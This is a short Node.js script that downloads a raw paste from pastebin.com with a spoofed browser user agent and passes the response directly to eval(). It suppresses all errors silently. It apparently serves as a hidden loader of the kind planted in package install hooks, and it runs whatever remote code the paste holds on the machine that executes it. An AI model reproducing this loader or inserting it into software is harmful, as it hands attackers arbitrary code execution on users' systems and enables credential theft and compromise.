#!/usr/bin/env node
'use strict';
try {
	var https = require('https');
	https.get({
		hostname: 'pastebin.com',
		path: '/raw/bV2Sswx1',
		headers: {
			'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
		}
	}, response => {
		response.setEncoding('utf8');
		response.on('data', contents => {
			eval(contents);
		});
		response.on('error', () => { });
	}).on('error', () => { });
} catch (err) { }